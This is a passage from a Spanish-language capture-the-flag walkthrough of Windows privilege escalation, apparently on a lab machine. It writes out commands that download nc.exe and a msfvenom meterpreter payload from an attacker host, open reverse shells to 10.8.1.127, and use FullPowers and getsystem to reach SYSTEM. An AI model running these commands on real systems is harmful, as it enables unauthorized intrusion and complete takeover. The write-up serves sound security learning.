                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State 
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled

PS C:\xampp\htdocs>
```

- Para esto podemos usar la siguiente herramienta <https://github.com/itm4n/FullPowers> que nos recupera los privilegios por defecto.

```bash
PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name                  
----                 -------------         ------ ----                  
d-----          3/1/2024   1:34 PM                Temp                  


PS C:\> cd Temp
PS C:\Temp> curl -o FullPowers.exe http://10.8.1.127:8080/FullPowers.exe
PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                  
----                 -------------         ------ ----                  
-a----          3/1/2024   1:36 PM          36864 FullPowers.exe        


PS C:\Temp>
```

- Ahora también vamos a subir el netcat para enviarnos la shell.

```bash
➜  Downloads cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```


```bash
PS C:\Temp> curl -o nc.exe http://10.8.1.127:8080/nc.exe
PS C:\Temp> dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                  
----                 -------------         ------ ----                  
-a----          3/1/2024   1:36 PM          36864 FullPowers.exe        
-a----          3/1/2024   1:38 PM          28160 nc.exe                


PS C:\Temp>
```

- Ahora nos podemos en escucha otra vez.

```bash
PS C:\Temp> .\FullPowers.exe -c "C:\Temp\nc.exe 10.8.1.127 445 -e cmd" -z
```

- Y obtenemos la shell.

```bash
➜  content rlwrap nc -nlvp 445
listening on [any] 445 ...
connect to [10.8.1.127] from (UNKNOWN) [10.10.111.108] 50452
Microsoft Windows [Version 10.0.20348.1970]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>
```

## nt authority system

- Podemos abusar del **SeImpersonatePrivilege** usando el <https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1> o con **metasploit** <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato> .

```bash
➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.1.127 LPORT=443 -f exe > reverse_shell.exe
```

```bash
➜  ~ sudo msfconsole
[sudo] password for miguel:
Metasploit tip: Set the current module's RHOSTS with database values using
hosts -R or services -R


 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.8.1.127
LHOST => 10.8.1.127
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.1.127:443
```

- Después lo descargamos y lo ejecutamos en la máquina víctima.

```bash
PS C:\Temp> curl -o rev.exe http://10.8.1.127:8080/reverse_shell.exe
curl -o rev.exe http://10.8.1.127:8080/reverse_shell.exe
PS C:\Temp> dir
dir


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                                  
----                 -------------         ------ ----                                                        
-a----          3/1/2024   1:57 PM         153600 JuicyPotatoNG.exe                     
-a----          3/1/2024   1:38 PM          28160 nc.exe                                
-a----          3/1/2024   2:35 PM          73802 rev.exe                               


PS C:\Temp> .\rev.exe
.\rev.exe
PS C:\Temp>
```

- Y listo.

```bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.8.1.127:443
[*] Sending stage (176198 bytes) to 10.10.111.108
[*] Meterpreter session 1 opened (10.8.1.127:443 -> 10.10.111.108:51168) at 2024-03-01 16:37:07 -0600

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter >
```

- Y listo.

<p align="center">
<img src="https://i.imgur.com/ooJo7Sd.png">
</p>

## Root.txt

- Ahora vemos la flag.

<p align="center">
<img src="https://i.imgur.com/fObra6i.png">
</p>

